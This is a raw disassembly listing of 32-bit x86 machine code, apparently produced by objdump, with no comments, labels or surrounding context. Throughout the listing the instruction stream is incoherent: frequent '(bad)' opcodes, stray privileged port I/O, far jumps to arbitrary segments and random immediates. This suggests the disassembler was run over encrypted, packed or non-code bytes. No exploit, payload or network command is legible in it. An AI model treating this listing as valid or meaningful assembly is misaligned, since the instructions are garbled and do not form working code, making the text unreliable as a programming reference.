  41e6cb:	out    dx,eax
  41e6cc:	xchg   ebx,eax
  41e6cd:	iret   
  41e6ce:	inc    ecx
  41e6cf:	pop    edi
  41e6d0:	pop    ecx
  41e6d1:	stc    
  41e6d2:	push   eax
  41e6d3:	xchg   esi,eax
  41e6d4:	adc    eax,0xe9964558
  41e6d9:	or     DWORD PTR [ebp+0x99b57cf],edx
  41e6df:	sbb    eax,0x101a6d12
  41e6e4:	inc    ebp
  41e6e5:	(bad)  
  41e6e6:	jae    0x41e6fd
  41e6e8:	cwde   
  41e6e9:	ins    BYTE PTR es:[edi],dx
  41e6ea:	loope  0x41e66c
  41e6ec:	jp     0x41e71a
  41e6ee:	sar    BYTE PTR [edx-0x59],1
  41e6f1:	jnp    0x41e75b
  41e6f3:	push   esp
  41e6f4:	cmp    ah,dh
  41e6f6:	jmp    0xa07040ff
  41e6fb:	fmul   DWORD PTR [eax+ebx*4]
  41e6fe:	int3   
  41e6ff:	(bad)  
  41e700:	mov    ecx,0x71ef75b3
  41e705:	or     edx,DWORD PTR [edi+ecx*4]
  41e708:	daa    
  41e709:	mov    al,BYTE PTR [edx-0x23]
  41e70c:	jecxz  0x41e783
  41e70e:	jmp    0x3853:0xa8f330e9
  41e715:	addr16 jle 0x41e698
  41e718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e719:	push   ss
  41e71a:	cs jns 0x41e6e4
  41e71d:	(bad)  
  41e71e:	sti    
  41e71f:	fwait
  41e720:	ins    DWORD PTR es:[edi],dx
  41e721:	and    eax,0x7fbee4de
  41e726:	adc    dl,ah
  41e728:	in     eax,dx
  41e729:	push   0xffffffba
  41e72b:	mov    ebp,0x6136df59
  41e730:	in     al,dx
  41e731:	in     eax,0x88
  41e733:	pop    eax
  41e734:	jg     0x41e77a
  41e736:	sahf   
  41e737:	xor    ebx,0xffffffa5
  41e73a:	repnz sbb BYTE PTR [eax-0x5c],bl
  41e73e:	adc    BYTE PTR [ebp-0x59e0785c],0xf8
  41e745:	stos   BYTE PTR es:[edi],al
  41e746:	mov    ah,0x66
  41e748:	js     0x41e7b2
  41e74a:	test   BYTE PTR [ecx+0x56329c5b],0x77
  41e751:	dec    edi
  41e752:	enter  0x70a6,0x7d
  41e756:	jne    0x41e736
  41e758:	xlat   BYTE PTR ds:[ebx]
  41e759:	int3   
  41e75a:	loope  0x41e741
  41e75c:	fstp   QWORD PTR [edx+edx*1-0x79]
  41e760:	les    esi,FWORD PTR [ecx]
  41e762:	pop    DWORD PTR [eax]
  41e764:	pop    edx
  41e765:	sbb    DWORD PTR [edi+0x318fc8e2],edi
  41e76b:	and    edi,ecx
  41e76d:	les    esp,FWORD PTR [ecx-0x3f]
  41e770:	rol    DWORD PTR [esi-0x3694fb8c],1
  41e776:	xor    BYTE PTR [edx],al
  41e778:	jle    0x41e7d0
  41e77a:	sbb    ebp,DWORD PTR [edi+0x5c8f535f]
  41e780:	add    esi,0xc69dbb94
  41e786:	and    DWORD PTR [edx+ecx*4+0x6f],ebp
  41e78a:	adc    edi,ecx
  41e78c:	test   DWORD PTR ds:0x2eb0c4d7,edx
  41e792:	pop    ecx
  41e793:	clc    
  41e794:	push   ds
  41e795:	out    dx,eax
  41e796:	xchg   esp,eax
  41e797:	mov    dh,0x4a
  41e799:	mov    ecx,0x551255c6
  41e79e:	cwde   
  41e79f:	push   cs
  41e7a0:	cwde   
  41e7a1:	sub    BYTE PTR [edi-0x2c],cl
  41e7a4:	mov    ds:0x7e1ce82c,al
  41e7a9:	mov    gs,WORD PTR [ecx+0x29]
  41e7ac:	mov    BYTE PTR [esp+edx*2+0x5a],al
  41e7b0:	push   ds
  41e7b1:	rcl    DWORD PTR [eax-0x7b],1
  41e7b4:	sahf   
  41e7b5:	enter  0x5a67,0xd2
  41e7b9:	ja     0x41e7c5
  41e7bb:	adc    dl,cl
  41e7bd:	fs jmp 0xdaed5a6
  41e7c3:	iret   
  41e7c4:	cmp    dl,BYTE PTR [esi-0x2f]
  41e7c7:	retf   0xbf22
  41e7ca:	retf   0xb382
  41e7cd:	push   cs
  41e7ce:	push   es
  41e7cf:	adc    bh,al
  41e7d1:	sti    
  41e7d2:	retf   
  41e7d3:	or     DWORD PTR [ebp-0x13fa2cea],0xffffff98
  41e7da:	fldenv cs:[ebp+0x36537f24]
  41e7e1:	add    BYTE PTR [ebp+edi*1-0x45],al
  41e7e5:	mov    al,0x55
  41e7e7:	repnz mov al,ds:0xafde7008
  41e7ed:	ins    DWORD PTR es:[edi],dx
  41e7ee:	sub    BYTE PTR [eax-0x1d0fb60b],bl
  41e7f4:	push   0xffffffb3
  41e7f6:	add    al,0xb3
  41e7f8:	sbb    BYTE PTR [edi-0x4],0x3d
  41e7fc:	ret    0xf615
  41e7ff:	mov    ch,0xe3
  41e801:	adc    bl,BYTE PTR [ebx]
  41e803:	or     DWORD PTR [eax-0x5ae7b726],ecx
  41e809:	mov    ebp,0xe33b145b
  41e80e:	mov    ecx,0x20af3bdb
  41e813:	stos   BYTE PTR es:[edi],al
  41e814:	xchg   esp,eax
  41e816:	dec    eax
  41e817:	xlat   BYTE PTR ds:[ebx]
  41e818:	fistp  DWORD PTR [ecx+0x23bd7c8f]
  41e81e:	inc    ebx
  41e81f:	pop    ebp
  41e820:	fcomp  QWORD PTR [edx]
  41e822:	sbb    DWORD PTR [ecx-0x7415d5e3],eax
  41e828:	dec    ecx
  41e829:	cmp    dh,0x44
  41e82c:	jmp    0x311786ab
  41e831:	fld    TBYTE PTR [edx-0x53c3cd2d]
  41e837:	jne    0x41e8b0
  41e839:	out    dx,al
  41e83a:	mov    bh,BYTE PTR [edi+0x10]
  41e83d:	repnz mov dh,0xba
  41e840:	mov    ebp,0xc598661c
  41e845:	loop   0x41e807
  41e847:	dec    ebx
  41e848:	adc    edi,edx
  41e84a:	fcomp  DWORD PTR [edi+edx*4+0x4a]
  41e84e:	add    BYTE PTR [edi+0x5951944e],bl
  41e854:	push   0x47387f06
  41e859:	in     eax,0xe0
  41e85b:	aam    0x86
  41e85d:	ja     0x41e8d3
  41e85f:	pop    eax
  41e860:	ins    DWORD PTR es:[edi],dx
  41e861:	xchg   DWORD PTR [ecx-0x19],edi
  41e864:	add    al,0x6e
  41e866:	rcr    BYTE PTR [edx-0x80],cl
  41e869:	jge    0x41e86f
  41e86b:	inc    esi
  41e86c:	push   cs
  41e86d:	xor    ecx,DWORD PTR [esi]
  41e86f:	lock (bad) [eax+0x1bd6ca17]
  41e876:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41e878:	dec    eax
  41e879:	xchg   edi,eax
  41e87a:	add    al,0x8
  41e87c:	in     al,0xb5
  41e87e:	xchg   esi,eax
  41e87f:	push   DWORD PTR [edi+0x5b]
  41e882:	cdq    
  41e883:	push   esi
  41e884:	xchg   esi,eax
  41e885:	mov    ds:0xd0838309,al
  41e88a:	(bad)  
  41e88c:	nop
  41e88d:	mov    bh,0x62
  41e88f:	out    0xd,al
  41e891:	mov    eax,ds:0x355c9636
  41e896:	retf   
  41e897:	lea    ecx,ds:0xaf5082b5
  41e89d:	stos   BYTE PTR es:[edi],al
  41e89e:	std    
  41e89f:	(bad)  
  41e8a0:	jmp    0x41e890
  41e8a2:	dec    ecx
  41e8a3:	xchg   BYTE PTR [ebx+edi*2],dl
  41e8a6:	xor    BYTE PTR [eax-0x9],ah
  41e8a9:	rcl    BYTE PTR [esi+edx*2+0x76d16ceb],1
  41e8b0:	jmp    0x15d6daa3
  41e8b5:	sbb    BYTE PTR [ebx+0x9],0xa
  41e8b9:	and    al,0xe8
  41e8bb:	cmp    eax,0x7204f992
  41e8c0:	mov    ds:0x1d693f71,eax
  41e8c5:	xor    BYTE PTR [ebx],0x5f
  41e8c8:	add    DWORD PTR [edi+0x57694fbd],ebp
  41e8ce:	out    0x59,al
  41e8d0:	addr16 pop ss
  41e8d2:	push   cs
  41e8d3:	and    ah,bl
  41e8d5:	xor    DWORD PTR [ebp-0x53],0xffffffdd
  41e8d9:	or     ch,BYTE PTR ds:0xf334c3f9
  41e8df:	outs   dx,BYTE PTR ds:[esi]
  41e8e0:	or     eax,0xb3c72f02
  41e8e5:	jmp    0x7e5e:0xeff37c5d
  41e8ec:	in     al,dx
  41e8ed:	jno    0x41e873
  41e8ef:	inc    ecx
  41e8f0:	push   edi
  41e8f1:	pop    ss
  41e8f2:	ins    BYTE PTR es:[edi],dx
  41e8f3:	arpl   bp,ax
  41e8f5:	mov    ah,0x4e
  41e8f7:	out    0xf1,al
  41e8f9:	aad    0x70
  41e8fb:	and    DWORD PTR [edx],ecx
  41e8fd:	fld    QWORD PTR [eax-0x6]
  41e900:	js     0x41e907
  41e902:	mov    ebx,0x715976e0
  41e907:	ins    BYTE PTR es:[edi],dx
  41e908:	pop    edi
  41e909:	arpl   WORD PTR [ebx],cx
  41e90b:	cmc    
  41e90c:	push   es
  41e90d:	jbe    0x41e8fd
  41e90f:	inc    esp
  41e910:	xchg   edi,eax
  41e911:	in     eax,dx
  41e912:	add    dl,bh
  41e914:	push   esi
  41e915:	jp     0x41e8b8
  41e917:	ret    
  41e918:	outs   dx,DWORD PTR ds:[esi]
  41e919:	mov    eax,0x5bfd8bf7
  41e91e:	or     BYTE PTR [ebx-0x42b12ac1],al
  41e924:	dec    ebx
  41e925:	push   edx
  41e926:	and    al,0x71
  41e928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e929:	shl    edi,0xf4
  41e92c:	mov    al,ds:0xaa11194d
  41e931:	push   ebp
  41e932:	ins    BYTE PTR es:[edi],dx
  41e933:	in     eax,0x88
  41e935:	adc    al,BYTE PTR [esi+0x74249c80]
  41e93b:	out    dx,al
  41e93c:	(bad)  
  41e93e:	scas   eax,DWORD PTR es:[edi]
  41e93f:	repnz add DWORD PTR [edx],edi
  41e942:	js     0x41e8f4
  41e944:	aad    0xf1
  41e946:	add    esp,edi
  41e948:	cdq    
  41e949:	pop    ss
  41e94a:	mov    DWORD PTR [edi+0x4e],0x2a31b9ae
  41e951:	adc    DWORD PTR es:0xd49ea4f5,edi
  41e958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e959:	mov    eax,0xaa953d2b
  41e95e:	(bad)  
  41e95f:	mov    edi,0x63c59afb
  41e964:	and    eax,0xa2ad8c22
  41e969:	loop   0x41e991
  41e96b:	or     al,0x14
  41e96d:	cmp    eax,0x40eb2a1
  41e972:	es xor ecx,edx
  41e975:	test   eax,0x24355034
  41e97a:	mov    al,ds:0x2131bd1c
  41e97f:	(bad)  
  41e980:	sar    bl,1
  41e982:	jecxz  0x41e9bc
  41e984:	frstor [eax]
  41e986:	sbb    ebp,DWORD PTR [ecx+0x640d2ec]
  41e98c:	retf   0x61cc
  41e98f:	or     cl,BYTE PTR [eax-0x54]
  41e992:	and    edi,edx
  41e994:	ins    BYTE PTR es:[edi],dx
  41e995:	xlat   BYTE PTR gs:[ebx]
  41e997:	add    DWORD PTR [ebp+0x1cb07024],esp
  41e99d:	fsubr  QWORD PTR [eax+0x77156e67]
  41e9a3:	jg     0x41ea0a
  41e9a5:	ret    0xe97d
  41e9a8:	hlt    
  41e9a9:	inc    edi
  41e9aa:	mov    ds,edi
  41e9ac:	stos   DWORD PTR es:[edi],eax
  41e9ad:	test   al,al
  41e9af:	repnz mov ds:0xcda77d0f,eax
  41e9b5:	nop
  41e9b6:	jecxz  0x41e9ba
  41e9b8:	ret    0x67f0
  41e9bb:	out    dx,eax
  41e9bc:	push   esp
  41e9bd:	mov    ds:0x96193889,eax
  41e9c2:	dec    eax
  41e9c3:	adc    al,0x42
  41e9c5:	mov    ebx,0xd50ef1b
  41e9ca:	daa    
  41e9cb:	lds    edi,FWORD PTR [edi]
  41e9cd:	out    dx,eax
  41e9ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9cf:	add    esi,DWORD PTR [esp+ebx*2]
  41e9d2:	push   ecx
  41e9d3:	mov    BYTE PTR [esi-0x136826ac],dh
  41e9d9:	sbb    eax,0x513a3c20
  41e9de:	pop    edi
  41e9df:	sbb    BYTE PTR [ecx-0x1f],bh
  41e9e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9e3:	dec    ebx
  41e9e4:	jnp    0x41ea54
  41e9e6:	sbb    BYTE PTR [edx-0x69],bl
  41e9e9:	sahf   
  41e9ea:	xchg   ebx,eax
  41e9eb:	mov    bh,0x26
  41e9ed:	inc    eax
  41e9ee:	cmp    BYTE PTR [eax-0x4f],bl
  41e9f1:	(bad)  
  41e9f2:	lea    ebx,[edx+0x7e]
  41e9f5:	fcom   DWORD PTR [edx-0x6b]
  41e9f8:	push   esp
  41e9f9:	mov    al,ds:0x20013a9b
  41e9fe:	sub    ah,BYTE PTR [edx]
  41ea00:	xchg   ebx,eax
  41ea01:	add    ebx,DWORD PTR [edi]
  41ea03:	dec    eax
  41ea04:	shr    DWORD PTR [eax+0x26030f07],cl
  41ea0a:	mov    DWORD PTR [ebx+0x41],0x182de736
  41ea11:	inc    esp
  41ea12:	das    
  41ea13:	test   DWORD PTR [esi+ecx*1+0x30ea9dad],ebx
  41ea1a:	xor    ecx,DWORD PTR [edi+ebp*2+0x7c870cc6]
  41ea21:	cmp    esi,edx
  41ea23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea24:	je     0x41ea6d
  41ea26:	pop    es
  41ea27:	or     bl,BYTE PTR [ebx+0x130518f8]
  41ea2d:	mov    ds,WORD PTR [eax-0x3be4f1f1]
  41ea33:	mov    ebx,ebx
  41ea35:	cli    
  41ea36:	xlat   BYTE PTR ds:[ebx]
  41ea37:	in     al,dx
  41ea38:	nop
  41ea39:	test   al,0x55
  41ea3b:	hlt    
  41ea3c:	into   
  41ea3d:	pop    ecx
  41ea3e:	add    cl,al
  41ea40:	push   cs
  41ea41:	pop    ebx
  41ea42:	arpl   WORD PTR [ecx-0x108b8748],dx
  41ea48:	adc    eax,0xabc32bf1
  41ea4d:	mov    ebp,0x173967a0
  41ea52:	loopne 0x41eabd
  41ea54:	pop    ebp
  41ea55:	fwait
  41ea56:	jae    0x41ea26
  41ea58:	jns    0x41ea41
  41ea5a:	daa    
  41ea5b:	mov    cl,0x85
  41ea5d:	pop    ebx
  41ea5e:	xchg   edx,eax
  41ea5f:	push   es
  41ea60:	cli    
  41ea61:	push   ss
  41ea62:	cli    
  41ea63:	loop   0x41ea52
  41ea65:	dec    ecx
  41ea66:	adc    eax,0x63627374
  41ea6b:	push   edx
  41ea6c:	es xchg esp,eax
  41ea6e:	sub    eax,0x120d3e3d
  41ea73:	mov    bh,0xbe
  41ea75:	sbb    al,0xaa
  41ea77:	jne    0x41ea5e
  41ea79:	mov    ebp,0x9245f36d
  41ea7e:	pop    DWORD PTR [edi+esi*1+0x49]
  41ea82:	sbb    ebp,edx
  41ea84:	retf   
  41ea85:	(bad)  
  41ea86:	pop    eax
  41ea87:	dec    eax
  41ea88:	in     al,0x59
  41ea8a:	inc    edi
  41ea8b:	and    esp,DWORD PTR [ebx-0x43]
  41ea8e:	ret    0x545f
  41ea91:	or     BYTE PTR [edi],dl
  41ea93:	shr    DWORD PTR [edx+0x2b],0x17
  41ea97:	aas    
  41ea98:	push   eax
  41ea99:	mov    eax,ds:0x881851b9
  41ea9e:	adc    al,0xe4
  41eaa0:	lds    esi,FWORD PTR [eax+0x36]
  41eaa3:	xor    DWORD PTR [eax+0x529058b9],edx
  41eaa9:	outs   dx,BYTE PTR ds:[esi]
  41eaaa:	mov    edx,0xac7ddb02
  41eaaf:	add    al,0x52
  41eab1:	xchg   edx,eax
  41eab2:	mov    edi,0xb923b52c
  41eab7:	inc    esi
  41eab8:	(bad)  
  41eab9:	leave  
  41eaba:	pushf  
  41eabb:	daa    
  41eabc:	or     BYTE PTR [ebp+0x319bf2b2],al
  41eac2:	mov    bl,0x30
  41eac4:	shl    DWORD PTR [edi-0x16],1
  41eac7:	jne    0x41ea49
  41eac9:	push   ecx
  41eaca:	mov    esi,0x31f94206
  41eacf:	jnp    0x41ea95
  41ead1:	push   eax
  41ead2:	out    0x59,al
  41ead4:	arpl   bx,bp
  41ead6:	and    ebx,ecx
  41ead8:	or     al,0x6b
  41eada:	repnz mov eax,ds:0x82f886eb
  41eae0:	bound  esi,QWORD PTR [edi-0x50]
  41eae3:	add    al,0x13
  41eae5:	std    
  41eae6:	(bad)  
  41eae7:	mov    ds:0x550fb922,al
  41eaec:	sub    eax,0x9f4888d8
  41eaf1:	fisubr DWORD PTR [edx+0x4]
  41eaf4:	(bad)  
  41eaf5:	pop    esp
  41eaf6:	adc    bh,0xeb
  41eaf9:	int3   
  41eafa:	sub    al,0xb2
  41eafc:	imul   esp,eax,0xe680347c
  41eb02:	mov    esp,0x71c5d340
  41eb07:	inc    ebp
  41eb08:	add    bl,dl
  41eb0a:	sub    ebp,DWORD PTR [eax+0x17]
  41eb0d:	jne    0x41eab6
  41eb0f:	cdq    
  41eb10:	arpl   sp,cx
  41eb12:	pop    ebx
  41eb13:	dec    ecx
  41eb14:	cmp    al,0x7d
  41eb16:	mov    ecx,0x522501b7
  41eb1b:	repnz pop DWORD PTR [ebp+edx*4-0x28]
  41eb20:	pushf  
  41eb21:	mov    esp,0x878cd878
  41eb26:	rcr    BYTE PTR [ecx-0x6c],cl
  41eb29:	push   edi
  41eb2a:	mov    esi,0x1f5d1937
  41eb2f:	test   DWORD PTR [edx+edx*8+0x70852952],esi
  41eb36:	push   ecx
  41eb37:	shl    edx,cl
  41eb39:	cld    
  41eb3a:	out    0xa8,al
  41eb3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb3d:	dec    ebp
  41eb3e:	mov    ds:0xab9cf066,eax
  41eb43:	scas   al,BYTE PTR es:[edi]
  41eb44:	dec    BYTE PTR [edi+ebp*1]
  41eb47:	cli    
  41eb48:	mov    bl,0x7f
  41eb4a:	xor    edi,esi
  41eb4c:	push   edi
  41eb4d:	jns    0x41eb63
  41eb4f:	das    
  41eb50:	jno    0x41ebaf
  41eb52:	aaa    
  41eb53:	pushf  
  41eb54:	cmp    BYTE PTR [eax],al
  41eb56:	sbb    eax,0xea242d56
  41eb5b:	out    0xd8,al
  41eb5d:	inc    ebp
  41eb5e:	add    eax,0x540332e3
  41eb63:	lock jo 0x41eba7
  41eb66:	sbb    ebp,DWORD PTR [ecx]
  41eb68:	cs arpl cx,cx
  41eb6b:	shl    DWORD PTR [edx-0x5e007c6d],cl
  41eb71:	adc    eax,0xd3d9172e
  41eb76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb77:	lock neg DWORD PTR [eax+0x53]
  41eb7b:	mov    WORD PTR [edx+0x44f0198],gs
  41eb81:	popf   
  41eb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb83:	and    al,0x5c
  41eb85:	ds jne 0x41eb8d
  41eb88:	repnz icebp 
  41eb8a:	popf   
  41eb8b:	aaa    
  41eb8c:	and    esp,ebp
  41eb8e:	es mov bh,0xd4
  41eb91:	out    dx,al
  41eb92:	add    esp,ecx
  41eb94:	jo     0x41ebc9
  41eb96:	inc    edx
  41eb97:	sub    al,0x65
  41eb99:	push   0xffffffc5
  41eb9b:	or     DWORD PTR [ecx-0x55],ebp
  41eb9e:	data16 icebp 
  41eba0:	jg     0x41ebfd
  41eba2:	retf   0xa663
  41eba5:	mov    edx,0xc226192c
  41ebaa:	ror    ah,0xb7
  41ebad:	bound  ebp,QWORD PTR [edx+ecx*8-0x33]
  41ebb1:	dec    esp
  41ebb2:	dec    esp
  41ebb3:	outs   dx,BYTE PTR ds:[esi]
  41ebb4:	pusha  
  41ebb5:	les    edx,FWORD PTR [edi]
  41ebb7:	hlt    
  41ebb8:	jmp    0x41ec04
  41ebba:	inc    ebx
  41ebbb:	call   FWORD PTR [edi-0x3]
  41ebbe:	cmp    cl,BYTE PTR [ebp+0x7c36b92a]
  41ebc4:	fild   DWORD PTR [edi]
  41ebc6:	call   0xd7895fb
  41ebcb:	xor    eax,0xa900d9ca
  41ebd0:	stos   BYTE PTR es:[edi],al
  41ebd1:	and    al,BYTE PTR [edx-0x9d8efbf]
  41ebd7:	cmp    DWORD PTR [edi-0x1322d18c],0x66
  41ebde:	pop    edi
  41ebdf:	pop    ebp
  41ebe0:	icebp  
  41ebe1:	or     eax,0xec9d17ab
  41ebe6:	ret    
  41ebe7:	jno    0x41ebfc
  41ebe9:	dec    ecx
  41ebea:	or     DWORD PTR [eax-0x163a84d5],eax
  41ebf0:	jp     0x41ec50
  41ebf2:	push   cs
  41ebf3:	inc    esi
  41ebf4:	fcmove st,st(5)
  41ebf6:	mov    ah,0xe5
  41ebf8:	jb     0x41ebc6
  41ebfa:	(bad)  
  41ebfb:	xlat   BYTE PTR ds:[ebx]
  41ebfc:	retf   0x94c9
  41ebff:	shl    BYTE PTR [eax-0x61],1
  41ec02:	sar    DWORD PTR [eax+edi*1+0x65],1
  41ec06:	(bad)  
  41ec07:	cmp    eax,0x4cafc514
  41ec0c:	cmp    ch,BYTE PTR [ebp+0x2f]
  41ec0f:	push   eax
  41ec10:	adc    ch,ah
  41ec12:	scas   al,BYTE PTR es:[edi]
  41ec13:	shl    ecx,0xbc
  41ec16:	xchg   edi,eax
  41ec17:	and    eax,0xe857158e
  41ec1c:	or     al,0xde
  41ec1e:	xor    dl,bl
  41ec20:	mov    ds:0xa0a2e9d3,eax
  41ec25:	fadd   QWORD PTR [bx+di]
  41ec28:	js     0x41ebc3
  41ec2a:	xor    eax,0x4da1861
  41ec2f:	adc    eax,ecx
  41ec31:	ja     0x41ec69
  41ec33:	fisttp WORD PTR [ecx-0x17c1e676]
  41ec39:	rcl    BYTE PTR [ebx],0x15
  41ec3c:	adc    al,0x7e
  41ec3e:	push   esp
  41ec3f:	sub    ebx,ecx
  41ec41:	or     bl,bl
  41ec43:	ret    
  41ec44:	mov    esp,0xf13021ab
  41ec49:	sub    DWORD PTR ds:[edi+0x1b40120f],esi
  41ec50:	dec    esp
  41ec51:	xlat   BYTE PTR ds:[ebx]
  41ec52:	int    0x8
  41ec54:	cmc    
  41ec55:	leave  
  41ec56:	(bad)  
  41ec57:	mov    esi,0x90e0a53
  41ec5c:	lahf   
  41ec5d:	mov    eax,0x2bffa637
  41ec62:	in     al,dx
  41ec63:	push   ds
  41ec64:	push   ebx
  41ec65:	dec    ebx
  41ec66:	pop    ebp
  41ec67:	inc    edi
  41ec68:	mov    BYTE PTR [ecx-0x39],dh
  41ec6b:	push   ebx
  41ec6c:	adc    al,0x4d
  41ec6e:	xchg   edx,eax
  41ec6f:	jge    0x41ec92
  41ec71:	dec    eax
  41ec72:	clc    
  41ec73:	and    eax,0xe60ce912
  41ec78:	inc    edi
  41ec79:	mov    esp,0x9f3ff850
  41ec7e:	imul   esi,DWORD PTR [ebx+0x6d],0x7e
  41ec82:	sub    cl,0x82
  41ec85:	not    BYTE PTR [edi+0x51]
  41ec88:	push   0x14830f36
  41ec8d:	loop   0x41ecff
  41ec8f:	jl     0x41ec28
  41ec91:	pop    ebx
  41ec92:	and    ch,BYTE PTR [esi+eiz*8]
  41ec95:	inc    esp
  41ec96:	jg     0x41ed0e
  41ec98:	retf   0xa9c7
  41ec9b:	adc    al,0xd6
  41ec9d:	loope  0x41ec45
  41ec9f:	or     eax,0xbcdb021a
  41eca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eca5:	ror    BYTE PTR [edi],cl
  41eca7:	pop    ds
  41eca8:	in     al,0x42
  41ecaa:	es ss mov ebp,0xb493435
  41ecb1:	cld    
  41ecb2:	sub    al,dl
  41ecb4:	aas    
  41ecb5:	sbb    edi,DWORD PTR [esi]
  41ecb7:	data16 jecxz 0x41ec5c
  41ecba:	or     eax,0xebc48e43
  41ecbf:	or     al,0x21
  41ecc1:	dec    ecx
  41ecc2:	fst    st(5)
  41ecc4:	or     al,0x98
  41ecc6:	in     al,0x36
  41ecc8:	inc    ebx
  41ecc9:	dec    eax
  41ecca:	sti    
  41eccb:	mov    esp,DWORD PTR es:[ebp-0x74e4e70e]
  41ecd2:	pusha  
  41ecd3:	data16 das 
  41ecd5:	dec    ch
  41ecd7:	add    ah,BYTE PTR [ebp+0x7b]
  41ecda:	mov    eax,0x37e27e83
  41ecdf:	shl    DWORD PTR [ebx+0x7be661ca],cl
  41ece5:	sahf   
  41ece6:	mov    ebp,0xf9472b2d
  41eceb:	hlt    
  41ecec:	(bad)  
  41eced:	repz push edx
  41ecef:	inc    ecx
  41ecf0:	xchg   esp,eax
  41ecf1:	aaa    
  41ecf2:	mov    WORD PTR [eax+0x7d672c27],gs
  41ecf8:	ins    BYTE PTR es:[edi],dx
  41ecf9:	cmp    dh,bh
  41ecfb:	and    dh,BYTE PTR [ecx+ebp*2+0x46c576ac]
  41ed02:	mov    eax,0xb6c15995
  41ed07:	sub    BYTE PTR [eax+eax*4-0x73862422],cl
  41ed0e:	pop    ds
  41ed0f:	call   0x4fd8:0xcf1653fb
  41ed16:	add    al,0x50
  41ed18:	in     eax,0x50
  41ed1a:	jle    0x41ed23
  41ed1c:	xor    ebp,ecx
  41ed1e:	mov    bh,0x9f
  41ed20:	push   esi
  41ed21:	sbb    BYTE PTR ds:0xe3873eb,al
  41ed27:	aam    0x47
  41ed29:	or     DWORD PTR ss:[ebp-0x7ae73563],eax
  41ed30:	test   DWORD PTR [edi-0x113a533e],0x522961a0
  41ed3a:	pop    esi
  41ed3b:	lock lock into 
  41ed3e:	int    0xad
  41ed40:	scas   al,BYTE PTR es:[edi]
  41ed41:	test   DWORD PTR [ebx-0x32],ebx
  41ed44:	push   esp
  41ed45:	inc    ebp
  41ed46:	out    dx,al
  41ed47:	pop    ebx
  41ed48:	add    al,0x3e
  41ed4a:	shr    BYTE PTR [ebx-0x35affc5b],1
  41ed50:	je     0x41ed89
  41ed52:	mov    dh,0xa3
  41ed54:	and    dl,cl
  41ed56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed57:	sbb    eax,0xd9314ea4
  41ed5c:	cmp    DWORD PTR [edx],0xddd7cc7c
  41ed62:	dec    eax
  41ed63:	clc    
  41ed64:	loop   0x41ed9a
  41ed66:	clc    
  41ed67:	stos   DWORD PTR es:[edi],eax
  41ed68:	xchg   ecx,eax
  41ed69:	or     DWORD PTR es:[esi+0x684f36f7],edx
  41ed70:	add    BYTE PTR [ecx+0x6d],dh
  41ed73:	pop    edi
  41ed74:	fwait
  41ed75:	push   edi
  41ed76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed77:	adc    DWORD PTR [edx],esi
  41ed79:	ss (bad) 
  41ed7c:	inc    ebx
  41ed7d:	inc    ecx
  41ed7e:	nop
  41ed7f:	(bad)  
  41ed81:	or     ah,ch
  41ed83:	out    dx,eax
  41ed84:	pop    esp
  41ed85:	(bad)  
  41ed86:	mov    edx,0xc5a355c5
  41ed8b:	shr    DWORD PTR [ebp-0x74fe0aa8],1
  41ed91:	cs out 0x63,eax
  41ed94:	repnz test BYTE PTR [bx+0x716],bl
  41ed9a:	(bad)  
  41ed9b:	fimul  WORD PTR [eax-0x38]
  41ed9e:	adc    al,0x1d
  41eda0:	test   eax,0x7c8621bc
  41eda5:	and    edx,DWORD PTR [esi]
  41eda7:	push   esp
  41eda8:	(bad)  
  41eda9:	fdivp  st(2),st
  41edab:	pop    esi
  41edac:	sbb    ebp,DWORD PTR [eax-0x68b352ce]
  41edb2:	push   0xffffffa5
  41edb4:	dec    ebx
  41edb5:	pop    ds
  41edb6:	bound  edi,QWORD PTR [edi-0x65]
  41edb9:	ins    DWORD PTR es:[edi],dx
  41edba:	push   es
  41edbb:	jno    0x41ede7
  41edbd:	cmp    ebp,DWORD PTR [ebx]
  41edbf:	push   0x8ffd5eb4
  41edc4:	mov    ds,ebx
  41edc6:	gs dec esi
  41edc8:	dec    ecx
  41edc9:	xor    eax,0x6b061bb8
  41edce:	push   es
  41edcf:	push   ds
  41edd0:	retf   
  41edd1:	lock retf 0x95ce
  41edd5:	adc    al,0xd7
  41edd7:	lock outs dx,DWORD PTR ds:[esi]
  41edd9:	pop    edi
  41edda:	and    eax,0x5d9d26cb
  41eddf:	stc    
  41ede0:	mov    dh,bl
  41ede2:	inc    esp
  41ede3:	mov    edx,0xc13be29f
  41ede8:	pop    es
  41ede9:	mov    bl,0x91
  41edeb:	test   BYTE PTR [edx-0x1283b360],ch
  41edf1:	mov    bh,0x84
  41edf3:	(bad)  
  41edf5:	lds    esi,FWORD PTR [ecx-0x80]
  41edf8:	outs   dx,DWORD PTR ds:[esi]
  41edf9:	add    DWORD PTR [eax-0x5d502e9d],esp
  41edff:	int    0x9b
  41ee01:	call   0xf90d5275
  41ee06:	pop    esp
  41ee07:	dec    edx
  41ee08:	int    0x1f
  41ee0a:	sbb    eax,edi
  41ee0c:	(bad)  
  41ee0d:	inc    ecx
  41ee0e:	aas    
  41ee0f:	hlt    
  41ee10:	sub    BYTE PTR [eax+esi*4+0x7a],0x3e
  41ee15:	es nop
  41ee17:	inc    esp
  41ee18:	je     0x41ee19
  41ee1a:	pop    esp
  41ee1b:	shr    ebx,1
  41ee1d:	jmp    0x41edb0
  41ee1f:	jg     0x41ee2b
  41ee21:	push   ebx
  41ee22:	dec    ecx
  41ee23:	cmp    ah,dh
  41ee25:	sbb    ah,BYTE PTR [edi+0x7aaab473]
  41ee2b:	jp     0x41ee24
  41ee2d:	xor    eax,0xf7476361
  41ee32:	test   eax,0x20391cf2
  41ee37:	and    esi,eax
  41ee39:	(bad)  
  41ee3a:	gs pushf 
  41ee3c:	mov    WORD PTR [edx+0x43],cs
  41ee3f:	out    dx,al
  41ee40:	repz pop ecx
